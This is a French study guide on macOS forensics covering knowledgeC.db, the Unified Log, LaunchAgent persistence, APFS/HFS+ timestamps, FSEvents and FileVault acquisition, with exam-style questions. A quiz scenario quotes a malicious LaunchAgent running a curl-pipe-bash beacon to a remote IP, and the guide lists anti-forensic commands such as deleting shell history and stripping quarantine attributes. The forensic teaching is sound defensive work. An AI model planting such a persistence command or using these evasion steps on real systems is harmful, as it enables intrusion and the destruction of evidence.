🍎 macOS forensique — Darwin BSD + couches Apple
macOS repose sur Darwin (noyau BSD open-source) auquel Apple a ajouté des couches propriétaires. Cette double nature a une conséquence directe en forensique : macOS hérite de la structure Unix (/etc/, /var/log/, .bash_history) et génère des artefacts exclusivement Apple (Unified Log, knowledgeC.db, FSEvents, QuarantineDB, Spotlight). La richesse forensique d'un Mac est exceptionnelle — à condition de savoir où chercher. Beaucoup de ces sources persistent après suppression des fichiers qu'elles référencent.

🔍 knowledgeC.db — La boîte noire de l'utilisateur
🎯 knowledgeC.db est l'artefact macOS le plus puissant pour la forensique comportementale. C'est la base de données du Knowledge Graph d'Apple — le moteur qui alimente Siri Suggestions. Elle enregistre tout ce que l'utilisateur fait avec précision nanoseconde (APFS timestamp). Elle est alimentée en continu en arrière-plan, même quand Siri est désactivé.
📱 Applications
Quelle app était au premier plan, pendant combien de temps, à quelle heure exacte. Résolution sub-seconde.
🔍 Recherches
Termes recherchés dans Spotlight, Safari, apps. Révèle l'intention même si les fichiers résultants sont supprimés.
📍 Localisation
Coordonnées GPS, adresse résolue, précision. Corrélable avec les horodatages d'activité.
🎵 Médias
Musique, podcasts, vidéos écoutés/regardés. Inclut Apple Music, Spotify, QuickTime.
🔋 Batterie & écran
Moments où l'écran était allumé/éteint, verrouillé. Confirme ou infirme un alibi.
💬 Contacts
Interactions avec des contacts (appels, messages). Croise avec les contacts Carnet d'adresses.
# Lire knowledgeC.db avec sqlite3
sqlite3 knowledgeC.db ".tables"

# Requête : activité des applications avec durée
SELECT ZOBJECT.ZVALUESTRING as app,
    datetime(ZOBJECT.ZSTARTDATE + 978307200, 'unixepoch') as start,
    datetime(ZOBJECT.ZENDDATE + 978307200, 'unixepoch') as end,
    (ZOBJECT.ZENDDATE - ZOBJECT.ZSTARTDATE) as duration_sec
FROM ZOBJECT
WHERE ZOBJECT.ZSTREAMNAME = '/app/inFocus'
ORDER BY ZOBJECT.ZSTARTDATE DESC LIMIT 50;

🔑 Epoch Apple — Attention pièges timestamps

  • APFS : nanosecondes depuis 01.01.2001 (Mac Epoch)
  • HFS+ : secondes depuis 01.01.1904 (Mac Epoch classique)
  • plist : secondes depuis 01.01.2001 (CoreData)
  • Conversion CoreData → Unix : ts + 978307200
  • Outil : DCode, APOLLO, mac_apt

⚠️ Signaux d'anti-forensique macOS

  • Corbeille vidée + Spotlight désactivé = réduction traces
  • mdutil -i off / = désactivation indexation Spotlight
  • Terminal history effacé (rm ~/.bash_history ~/.zsh_history)
  • FileVault activé sans clé de récupération = blocage acquisition
  • Puce T2/M-series : secure boot peut bloquer le boot depuis USB
📋 Unified Logging System — Depuis macOS 10.12 Sierra (2016)
Apple a remplacé le syslog classique par un système de logs unifié binaire en 2016. L'Unified Log enregistre des centaines de millions d'événements depuis tous les composants système, drivers et applications. Format binaire .tracev3, stocké dans /var/db/diagnostics/. Les strings de log sont séparées des données dans /var/db/uuidtext/ (UUID par binaire). L'outil natif est log — disponible uniquement sur un Mac en vie ou via mac_apt hors-ligne.
🗂 Structure on-disk
/var/db/diagnostics/
· Persist/ — logs persistants (jours/semaines)
· HighVolume/ — logs très fréquents (rotation rapide)
· Signpost/ — performance events
· Special/ — logs de démarrage (boottime)

/var/db/uuidtext/ — bibliothèque de chaînes (formatstrings)
Nécessaire pour décoder les .tracev3 hors-ligne.
⚡ Points clés forensiques
Rétention : Persist/ garde ~7 jours · HighVolume/ quelques heures
Résolution : nanoseconde (APFS clock)
Subsystems : chaque composant a un identifiant (ex: com.apple.security)
Categories : sous-classification au sein d'un subsystem
Niveaux : Default · Info · Debug · Error · Fault

🎓 Exam Tip — Unified Log

Unified Log = remplace syslog depuis macOS 10.12 · Format binaire .tracev3 · Outil natif : log

Deux dossiers indissociables : /var/db/diagnostics/ (données) + /var/db/uuidtext/ (chaînes) → copier les deux

Rétention limitée : Persist/ ≈ 7 jours · HighVolume/ peut être effacé en heures

Hors-ligne : mac_apt ou UnifiedLogReader — la commande log native ne fonctionne que sur macOS

Un analyste récupère une image disque d'un Mac suspect. Il copie /var/db/diagnostics/ mais pas /var/db/uuidtext/. Que se passe-t-il quand il tente de lire les logs ?Unified Log · Niveau : facile
Les logs s'affichent avec des messages illisibles — uniquement des adresses mémoire et des valeurs brutes à la place des chaînes de texte. Le dossier /var/db/uuidtext/ contient les format strings associées à chaque UUID de binaire. Sans lui, UnifiedLogReader et mac_apt ne peuvent pas substituer les arguments dans les messages. Toujours copier les deux dossiers ensemble.
🔄 Persistance macOS — LaunchServices & au-delà
macOS structure la persistance autour des Property Lists (.plist) et du démon launchd (PID 1). Contrairement à Windows avec son registre centralisé, les points de persistance macOS sont dispersés en fichiers .plist dans des dizaines d'emplacements. Chaque mécanisme a une portée différente (système vs utilisateur, démarrage vs session). Les attaquants ciblent prioritairement les LaunchAgents utilisateur (pas besoin de root) et les LaunchDaemons système (accès root, démarrage avant login).

🎯 Red flag absolu : un LaunchAgent/Daemon avec RunAtLoad = true + ProgramArguments pointant vers /tmp/, /var/folders/, ou un script en base64 encodé dans ProgramArguments. Vérifier aussi EnvironmentVariables — un C2 peut passer ses paramètres via des variables d'environnement.
Un plist trouvé dans ~/Library/LaunchAgents/com.apple.update.helper.plist contient RunAtLoad = true et ProgramArguments = ["/bin/bash", "-c", "curl -s http://185.x.x.x/beacon | bash"]. Quels artefacts permettent de dater son installation ?Persistance · Niveau : moyen
1. Timestamps du fichier plist : GetFileInfo ~/Library/LaunchAgents/com.apple.update.helper.plist → date de création et modification.
2. FSEvents : /.fseventsd/ enregistre la création du fichier dans ~/Library/LaunchAgents/ avec timestamp précis.
3. Unified Log : log show --predicate 'subsystem == "com.apple.launchd" AND eventMessage CONTAINS "com.apple.update.helper"' → premier chargement par launchd.
4. QuarantineDB : si le dropper a été téléchargé, l'URL source est dans QuarantineEventsV2.
5. Spotlight : peut avoir indexé le fichier plist et retenir des métadonnées même après suppression.
Note : le nom com.apple.update.helper est délibérément trompeur — comparer avec les plists Apple légitimes dans /System/Library/.
💾 Systèmes de fichiers macOS — HFS+ et APFS
macOS a utilisé HFS+ (Mac OS Extended) de 1998 jusqu'en 2017, puis Apple a introduit APFS (Apple File System) sur les SSD et puces Apple Silicon. Les deux coexistent encore : un Mac moderne avec Time Machine externe peut avoir un volume APFS interne et un volume HFS+ externe. Les timestamps sont radicalement différents entre les deux — erreur fréquente en forensique.
Timestamps macOS — Comparatif HFS+ vs APFS
📼 HFS+ — Mac OS Extended
Epoch : 1er janvier 1904 00:00:00 UTC
Résolution : 1 seconde
Stockage : 4 octets (uint32)
Conversion : unix = hfs - 2082844800
Timestamps : Created · Modified · Accessed · Backup
Limite : pas de ntime · granularité faible · problèmes DST
⚡ APFS — Apple File System (2017+)
Epoch : 1er janvier 2001 00:00:00 UTC
Résolution : 1 nanoseconde (le plus précis)
Stockage : 8 octets (int64, nanosecondes)
Conversion : unix = apfs/1e9 + 978307200
Timestamps : Created · Modified · Changed · Accessed
Atout : snapshots natifs · clones instantanés · chiffrement
FSEvents — Le journal du système de fichiers macOS
🎯 FSEvents est l'équivalent macOS du $UsnJrnl NTFS. C'est un journal des modifications du système de fichiers — créations, suppressions, renommages, modifications d'attributs. Il est stocké dans /.fseventsd/ sous forme de fichiers binaires numérotés séquentiellement. FSEvents survit aux redémarrages et peut révéler des fichiers supprimés longtemps après.
Structure des fichiers FSEvents
/.fseventsd/
· Fichiers nommés par numéro hexadécimal (ex: 000000000123ab4f)
· Format : gzip compressé, enregistrements binaires
· Chaque enregistrement : chemin complet + flags d'événement
· Pas de timestamp par événement — utiliser les timestamps des fichiers FSEvents eux-mêmes comme borne temporelle
Flags forensiques importants
Created — fichier créé
Removed — fichier supprimé (gold mine forensique)
Renamed — renommé (révèle extension camouflée)
Modified — contenu modifié
InodeMetaMod — métadonnées modifiées
XattrMod — attribut étendu modifié (quarantine, etc.)

Time Machine — Source de preuves historiques
📦 Time Machine HFS+ (classique)
Structure de dossiers datés dans /Volumes/Backup/Backups.backupdb/[hostname]/[date]/. Chaque sauvegarde = snapshot avec hard links vers les fichiers inchangés. Un fichier supprimé peut être retrouvé dans les sauvegardes précédentes. Monter le volume et naviguer directement.
⚡ Time Machine APFS (snapshots)
Utilise les snapshots APFS natifs sur le volume local (avant APFS externe). Commandes : tmutil listlocalsnapshots / · tmutil mount -snapshot com.apple.TimeMachine.2024-03-15-XXXXXX /mnt/snap. Snapshots locaux ≈ 24h de rétention selon l'espace disque.

⚠️ Pièges timestamps macOS

  • HFS+ Epoch 1904 ≠ APFS Epoch 2001 ≠ Unix Epoch 1970
  • Les plist CoreData utilisent l'Epoch 2001 : +978307200 pour Unix
  • macOS peut afficher les timestamps en heure locale — toujours vérifier le fuseau
  • Timezone dans : /etc/localtime et /Library/Preferences/.GlobalPreferences.plist
  • EXIF GPS vs macOS timezone = vecteur de détection de falsification

🔑 Attributs étendus — xattr

  • com.apple.quarantine — URL source + date + app ayant téléchargé
  • com.apple.metadata:kMDItemWhereFroms — URL origine Spotlight
  • xattr -l fichier.dmg — lister tous les attributs étendus
  • xattr -p com.apple.quarantine fichier.app — lire la quarantine
  • Un malware qui supprime son xattr quarantine : xattr -d com.apple.quarantine

🎓 Exam Tip — macOS Forensique

knowledgeC.db = boîte noire utilisateur · SQLite · Epoch 2001 · APOLLO pour le parser

QuarantineEventsV2 = URL source de chaque téléchargement · persiste après suppression du fichier

Unified Log : copier /var/db/diagnostics/ et /var/db/uuidtext/ — les deux sont indissociables

Un technicien DFIR récupère un MacBook Pro M2 d'un employé suspecté d'espionnage industriel. Le Mac est chiffré avec FileVault 2 et la puce M2 active le Secure Boot. Quelle est la stratégie d'acquisition optimale ?Acquisition macOS · Niveau : difficile
Situation : Apple Silicon (M2) + FileVault 2 = acquisition bit-à-bit classique impossible sans clé de déchiffrement.

Option 1 — Mac encore allumé et déverrouillé (idéal) :
· Brancher une clé USB et lancer un script de triage live : copier knowledgeC.db, QuarantineDB, LaunchAgents, Safari, Mail, Unified Log (log collect), bash/zsh history.
· Exporter le Unified Log : log collect --last 7d --output /Volumes/USB/sys.logarchive

Option 2 — Mac éteint, clé FileVault connue :
· Boot en mode récupération (maintenir bouton power) → désactiver Secure Boot dans Options de démarrage.
· Connecter en mode cible Thunderbolt → acquérir avec dc3dd depuis un Mac analyste.
· Si clé institutionnelle MDM disponible : utiliser la clé de récupération FileVault.

Option 3 — Mac éteint, clé FileVault inconnue :
· Réquisition légale auprès d'Apple (MLAT si nécessaire) pour la clé de récupération iCloud.
· Si machine MDM : demander la clé de dépôt à l'administrateur IT.
· En dernier recours : image chiffrée + attaque par dictionnaire (peu probable sur FileVault 2 bien configuré).

Dans tous les cas : documenter chaque action, photographier, chaîne de custody.
